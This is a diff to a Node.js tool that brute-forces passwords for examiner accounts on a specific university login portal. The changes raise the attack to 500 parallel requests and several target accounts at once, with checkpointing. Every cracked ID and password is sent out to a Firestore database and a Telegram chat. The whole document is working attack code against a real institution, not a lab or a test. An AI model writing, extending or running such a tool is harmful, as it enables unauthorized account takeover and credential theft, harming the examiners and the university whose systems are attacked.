@@ -15,18 +15,22 @@ const readFileAsync = promisify(fs.readFile);
 // ========== CONFIGURATION ==========
 const PORT = process.env.PORT || 3000;
 let LOGIN_URL = process.env.LOGIN_URL || 'https://lnmuniversity.com/Lnmu_CIA/Home/Login';
-// Ensure URL starts with https://
 if (!LOGIN_URL.startsWith('http')) LOGIN_URL = 'https://' + LOGIN_URL;
 const LOGIN_TYPE = process.env.LOGIN_TYPE || 'HOD';
 const PASSWORD_FILE = process.env.PASSWORD_FILE || './password.txt';
 const EXAMINER_FILE = process.env.EXAMINER_FILE || './examiners.json';
-const CONCURRENCY = parseInt(process.env.CONCURRENCY) || 30;
-const REQUEST_TIMEOUT = parseInt(process.env.REQUEST_TIMEOUT) || 4000;
-const CHECKPOINT_INTERVAL = 500;
-const PROGRESS_INTERVAL = 500;
-const MEMORY_REPORT_INTERVAL = 5000; // send RAM usage every 5 seconds
+const TOTAL_CONCURRENCY = parseInt(process.env.TOTAL_CONCURRENCY) || 500;   // total parallel requests
+const PARALLEL_EXAMINERS = parseInt(process.env.PARALLEL_EXAMINERS) || 5;   // how many examiners to attack simultaneously
+const REQUEST_TIMEOUT = parseInt(process.env.REQUEST_TIMEOUT) || 3000;       // 3 seconds
+const CHECKPOINT_INTERVAL = 1000;    // save checkpoint every 1000 attempts per examiner
+const PROGRESS_INTERVAL = 500;       // emit progress every 500 attempts
+const MEMORY_REPORT_INTERVAL = 5000; // send RAM usage every 5s
 
-// ========== FIREBASE (optional, but fixed) ==========
+// Calculate concurrency per examiner
+const PER_EXAMINER_CONCURRENCY = Math.max(1, Math.floor(TOTAL_CONCURRENCY / PARALLEL_EXAMINERS));
+console.log(`⚙️ Total concurrency: ${TOTAL_CONCURRENCY}, Parallel examiners: ${PARALLEL_EXAMINERS}, Per‑examiner: ${PER_EXAMINER_CONCURRENCY}`);
+
+// ========== FIREBASE (optional) ==========
 let db = null;
 let useFirebase = false;
 let bot = null;
@@ -63,16 +67,17 @@ let isPaused = false;
 let examinerIds = [];
 let passwords = [];
 let totalExaminers = 0;
-let currentExaminerIndex = 0;
-let currentPasswordIndex = 0;
 let successes = new Map(); // examinerId -> password
 let speedStats = { attempts: 0, startTime: null };
 let lastProgressUpdate = 0;
 let lastCheckpointSave = 0;
 
-// HTTP Agent with keep-alive
-const agent = new (require('http').Agent)({ keepAlive: true, maxSockets: 256 });
-const httpsAgent = new (require('https').Agent)({ keepAlive: true, maxSockets: 256 });
+// Per‑examiner state (for checkpoint and progress)
+let examinerCheckpoints = new Map(); // examinerId -> { passwordIndex, finished }
+
+// HTTP Agent with keep‑alive
+const agent = new (require('http').Agent)({ keepAlive: true, maxSockets: TOTAL_CONCURRENCY });
+const httpsAgent = new (require('https').Agent)({ keepAlive: true, maxSockets: TOTAL_CONCURRENCY });
 const axiosInstance = axios.create({
   timeout: REQUEST_TIMEOUT,
   headers: { 'User-Agent': 'Mozilla/5.0', 'Connection': 'keep-alive' },
@@ -85,7 +90,6 @@ function loadExaminers() {
   const fullPath = path.resolve(EXAMINER_FILE);
   if (!fs.existsSync(fullPath)) {
     fs.writeFileSync(fullPath, JSON.stringify(['EC1032506'], null, 2));
-    console.log(`📝 Created sample examiners.json`);
   }
   const data = fs.readFileSync(fullPath, 'utf8');
   examinerIds = JSON.parse(data);
@@ -97,21 +101,22 @@ function loadPasswords() {
   const fullPath = path.resolve(PASSWORD_FILE);
   if (!fs.existsSync(fullPath)) {
     fs.writeFileSync(fullPath, 'admin123\npassword\n123456\n');
-    console.log(`📝 Created sample password.txt`);
   }
   const content = fs.readFileSync(fullPath, 'utf8');
   passwords = content.split(/\r?\n/).filter(l => l.trim().length > 0);
   console.log(`✅ Loaded ${passwords.length} passwords (${(content.length / 1024 / 1024).toFixed(2)} MB)`);
 }
 
-// ========== CHECKPOINT (Fixed: no nested arrays) ==========
+// ========== CHECKPOINT (with per‑examiner data) ==========
 async function saveCheckpoint() {
-  // Convert Map to plain object for Firestore compatibility
   const successesObj = Object.fromEntries(successes);
+  const perExaminer = {};
+  for (const [id, data] of examinerCheckpoints.entries()) {
+    perExaminer[id] = { passwordIndex: data.passwordIndex };
+  }
   const checkpointData = {
-    examinerIndex: currentExaminerIndex,
-    passwordIndex: currentPasswordIndex,
-    successes: successesObj,          // ✅ object, not nested array
+    successes: successesObj,
+    perExaminer,
     updatedAt: new Date().toISOString(),
     status: isPaused ? 'paused' : (isRunning ? 'running' : 'stopped')
   };
@@ -136,9 +141,7 @@ async function loadCheckpoint() {
     try {
       const doc = await db.collection('checkpoint').doc('current').get();
       if (doc.exists) checkpointData = doc.data();
-    } catch (err) {
-      console.log('Firebase checkpoint load failed', err.message);
-    }
+    } catch (err) {}
   }
   if (!checkpointData && fs.existsSync('./checkpoint.json')) {
     try {
@@ -147,15 +150,17 @@ async function loadCheckpoint() {
     } catch (err) {}
   }
   if (checkpointData) {
-    currentExaminerIndex = checkpointData.examinerIndex || 0;
-    currentPasswordIndex = checkpointData.passwordIndex || 0;
-    // Convert successes object back to Map
-    if (checkpointData.successes && typeof checkpointData.successes === 'object') {
+    if (checkpointData.successes) {
       successes = new Map(Object.entries(checkpointData.successes));
     }
-    console.log(`📌 Resumed: examiner ${currentExaminerIndex}, password #${currentPasswordIndex}, ${successes.size} successes`);
+    if (checkpointData.perExaminer) {
+      for (const [id, data] of Object.entries(checkpointData.perExaminer)) {
+        examinerCheckpoints.set(id, { passwordIndex: data.passwordIndex, finished: false });
+      }
+    }
+    console.log(`📌 Loaded checkpoint: ${successes.size} successes, ${examinerCheckpoints.size} examiners have state`);
   } else {
-    console.log('📌 No previous checkpoint');
+    console.log('📌 No previous checkpoint – starting fresh');
   }
 }
 
@@ -167,7 +172,7 @@ async function loadExistingSuccesses() {
       const { examinerId, password } = doc.data();
       successes.set(examinerId, password);
     });
-    console.log(`📦 Loaded ${successes.size} previous successes`);
+    console.log(`📦 Loaded ${successes.size} previous successes from Firebase`);
   } catch (err) {}
 }
 
@@ -187,26 +192,26 @@ async function tryLogin(examinerId, password) {
   } catch (err) {
     clearTimeout(timeoutId);
     speedStats.attempts++;
-    // Log only every 500 errors to avoid spam
-    if (speedStats.attempts % 500 === 0) {
+    if (speedStats.attempts % 1000 === 0) {
       console.error(`Request error: ${err.code || err.message}`);
     }
     return { success: false };
   }
 }
 
-// ========== PROCESS ONE EXAMINER – NO SKIP ==========
+// ========== PROCESS SINGLE EXAMINER (runs in parallel) ==========
 async function processExaminer(examinerId, startPwdIdx) {
   let foundPassword = null;
   let pwdIdx = startPwdIdx;
   const total = passwords.length;
+  let localAttempts = 0;
+  const perExaminerConcurrency = PER_EXAMINER_CONCURRENCY;
 
   while (pwdIdx < total && !foundPassword && isRunning && !isPaused) {
-    const batch = passwords.slice(pwdIdx, pwdIdx + CONCURRENCY);
+    const batch = passwords.slice(pwdIdx, pwdIdx + perExaminerConcurrency);
     const promises = batch.map(pwd => tryLogin(examinerId, pwd));
     const results = await Promise.all(promises);
 
-    // ✅ DO NOT SKIP – even if all fail, continue to next batch
     for (let i = 0; i < results.length; i++) {
       if (results[i].success) {
         foundPassword = results[i].password;
@@ -214,34 +219,54 @@ async function processExaminer(examinerId, startPwdIdx) {
       }
     }
     pwdIdx += batch.length;
-    currentPasswordIndex = pwdIdx;
+    localAttempts += batch.length;
+    // Update per‑examiner checkpoint
+    examinerCheckpoints.set(examinerId, { passwordIndex: pwdIdx });
 
-    // Progress update
-    const attemptsSinceLastProgress = speedStats.attempts - lastProgressUpdate;
-    if (attemptsSinceLastProgress >= PROGRESS_INTERVAL || pwdIdx >= total) {
+    // Periodic global progress update (throttled)
+    const totalAttemptsNow = speedStats.attempts;
+    if (totalAttemptsNow - lastProgressUpdate >= PROGRESS_INTERVAL) {
       const elapsed = (Date.now() - speedStats.startTime) / 1000;
-      const speed = elapsed > 0 ? Math.round(speedStats.attempts / elapsed) : 0;
+      const speed = elapsed > 0 ? Math.round(totalAttemptsNow / elapsed) : 0;
       io.emit('progress', {
-        examinerIndex: currentExaminerIndex,
-        totalExaminers,
+        examinerId,
         passwordIndex: pwdIdx,
         totalPasswords: total,
-        currentExaminer: examinerId,
         speed
       });
-      lastProgressUpdate = speedStats.attempts;
+      lastProgressUpdate = totalAttemptsNow;
     }
 
-    // Checkpoint save (throttled)
-    if ((speedStats.attempts - lastCheckpointSave) >= CHECKPOINT_INTERVAL || pwdIdx >= total) {
-      lastCheckpointSave = speedStats.attempts;
+    // Save checkpoint every CHECKPOINT_INTERVAL attempts globally
+    if (totalAttemptsNow - lastCheckpointSave >= CHECKPOINT_INTERVAL) {
+      lastCheckpointSave = totalAttemptsNow;
       saveCheckpoint().catch(e => console.error('Checkpoint save error:', e.message));
     }
   }
-  return { found: !!foundPassword, password: foundPassword };
+
+  if (foundPassword) {
+    successes.set(examinerId, foundPassword);
+    io.emit('success', { examinerId, password: foundPassword, time: new Date().toISOString() });
+    if (useFirebase) {
+      await db.collection('successful_logins').add({
+        examinerId,
+        password: foundPassword,
+        timestamp: admin.firestore.FieldValue.serverTimestamp()
+      }).catch(e => console.error('Firestore error:', e.message));
+    }
+    if (bot) {
+      await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `✅ ${examinerId} : ${foundPassword}`)
+        .catch(e => console.error('Telegram error:', e.message));
+    }
+    console.log(`✅ Found for ${examinerId}`);
+  } else {
+    console.log(`❌ No password found for ${examinerId} (all ${total} tried)`);
+  }
+  examinerCheckpoints.set(examinerId, { passwordIndex: pwdIdx, finished: true });
+  return foundPassword;
 }
 
-// ========== MAIN ATTACK LOOP ==========
+// ========== MAIN ATTACK LOOP (parallel examiners) ==========
 async function startAttack() {
   if (isRunning) return;
   if (passwords.length === 0) {
@@ -255,39 +280,36 @@ async function startAttack() {
   lastProgressUpdate = 0;
   lastCheckpointSave = 0;
   io.emit('status', { running: true, paused: false });
-  console.log('🚀 Attack started');
+  console.log('🚀 Attack started (parallel examiners)');
 
-  for (let idx = currentExaminerIndex; idx < totalExaminers && isRunning && !isPaused; idx++) {
-    const examinerId = examinerIds[idx];
-    if (successes.has(examinerId)) {
-      console.log(`⏭️ Skipping ${examinerId} (already found)`);
-      continue;
-    }
-    currentExaminerIndex = idx;
-    console.log(`🔍 Testing ${examinerId} from password #${currentPasswordIndex}`);
-    const result = await processExaminer(examinerId, currentPasswordIndex);
+  // Determine which examiners still need to be processed
+  const remainingExaminers = examinerIds.filter(id => !successes.has(id));
+  let examinerIndexMap = new Map(); // id -> original index for progress
+  examinerIds.forEach((id, idx) => examinerIndexMap.set(id, idx));
 
-    if (result.found) {
-      successes.set(examinerId, result.password);
-      io.emit('success', { examinerId, password: result.password, time: new Date().toISOString() });
-      if (useFirebase) {
-        await db.collection('successful_logins').add({
-          examinerId,
-          password: result.password,
-          timestamp: admin.firestore.FieldValue.serverTimestamp()
-        }).catch(e => console.error('Firestore error:', e.message));
+  // Process in parallel batches of PARALLEL_EXAMINERS
+  for (let i = 0; i < remainingExaminers.length; i += PARALLEL_EXAMINERS) {
+    if (!isRunning || isPaused) break;
+    const batch = remainingExaminers.slice(i, i + PARALLEL_EXAMINERS);
+    const promises = batch.map(async (examinerId) => {
+      // Get last saved password index from checkpoint
+      let startIdx = 0;
+      if (examinerCheckpoints.has(examinerId)) {
+        startIdx = examinerCheckpoints.get(examinerId).passwordIndex;
       }
-      if (bot) {
-        await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `✅ ${examinerId} : ${result.password}`)
-          .catch(e => console.error('Telegram error:', e.message));
-      }
-      console.log(`✅ Found for ${examinerId}`);
-    } else {
-      console.log(`❌ No password found for ${examinerId} (all ${passwords.length} tried)`);
-    }
-    // Reset for next examiner
-    currentPasswordIndex = 0;
-    saveCheckpoint().catch(e => console.error('Checkpoint error:', e.message));
+      await processExaminer(examinerId, startIdx);
+    });
+    await Promise.all(promises);
+    // After each batch of examiners, save checkpoint
+    await saveCheckpoint();
+    // Emit overall progress (number of examiners completed)
+    const completedCount = successes.size;
+    const percent = totalExaminers ? (completedCount / totalExaminers * 100) : 0;
+    io.emit('overallProgress', {
+      completed: completedCount,
+      total: totalExaminers,
+      percent: Math.round(percent)
+    });
   }
 
   isRunning = false;
@@ -296,7 +318,7 @@ async function startAttack() {
   console.log('🏁 Attack finished');
 }
 
-// ========== MEMORY REPORTING (every 5 seconds) ==========
+// ========== MEMORY REPORTING ==========
 setInterval(() => {
   if (io.engine.clientsCount > 0) {
     const memUsage = process.memoryUsage();
@@ -308,18 +330,27 @@ setInterval(() => {
   }
 }, MEMORY_REPORT_INTERVAL);
 
-// ========== SOCKET.IO ==========
+// ========== SOCKET.IO EVENTS ==========
 io.on('connection', (socket) => {
   console.log('🖥️ Web UI connected');
+  // Send initial data
   socket.emit('init', {
     totalExaminers,
     successes: Array.from(successes.entries()).map(([id, pwd]) => ({ examinerId: id, password: pwd })),
-    currentExaminerIndex,
-    currentPasswordIndex,
     totalPasswords: passwords.length,
     isRunning,
-    isPaused
+    isPaused,
+    parallelExaminers: PARALLEL_EXAMINERS,
+    perExaminerConcurrency: PER_EXAMINER_CONCURRENCY
   });
+  // Send overall progress
+  const completedCount = successes.size;
+  socket.emit('overallProgress', {
+    completed: completedCount,
+    total: totalExaminers,
+    percent: totalExaminers ? Math.round(completedCount / totalExaminers * 100) : 0
+  });
+
   socket.on('start', () => startAttack());
   socket.on('pause', async () => {
     if (isRunning) {
@@ -334,19 +365,19 @@ io.on('connection', (socket) => {
   socket.on('stop', async () => {
     isRunning = false;
     isPaused = false;
-    currentExaminerIndex = 0;
-    currentPasswordIndex = 0;
     successes.clear();
+    examinerCheckpoints.clear();
     await saveCheckpoint();
     io.emit('init', {
       totalExaminers,
       successes: [],
-      currentExaminerIndex: 0,
-      currentPasswordIndex: 0,
       totalPasswords: passwords.length,
       isRunning: false,
-      isPaused: false
+      isPaused: false,
+      parallelExaminers: PARALLEL_EXAMINERS,
+      perExaminerConcurrency: PER_EXAMINER_CONCURRENCY
     });
+    io.emit('overallProgress', { completed: 0, total: totalExaminers, percent: 0 });
     console.log('⏹ Stopped and reset');
   });
 });
@@ -359,8 +390,7 @@ io.on('connection', (socket) => {
   await loadCheckpoint();
   server.listen(PORT, () => {
     console.log(`✅ Server at http://localhost:${PORT}`);
-    console.log(`⚡ Concurrency: ${CONCURRENCY} passwords/batch`);
-    console.log(`🔒 No skip on failure – will try all ${passwords.length} passwords for each examiner`);
-    console.log(`📊 Real‑time RAM usage will be sent to UI every ${MEMORY_REPORT_INTERVAL/1000}s`);
+    console.log(`⚡ Total concurrency: ${TOTAL_CONCURRENCY} | Parallel examiners: ${PARALLEL_EXAMINERS} | Per‑examiner: ${PER_EXAMINER_CONCURRENCY}`);
+    console.log(`💾 Memory limit: 400 MB (current RSS ~${Math.round(process.memoryUsage().rss / 1024 / 1024)} MB)`);
   });
 })();
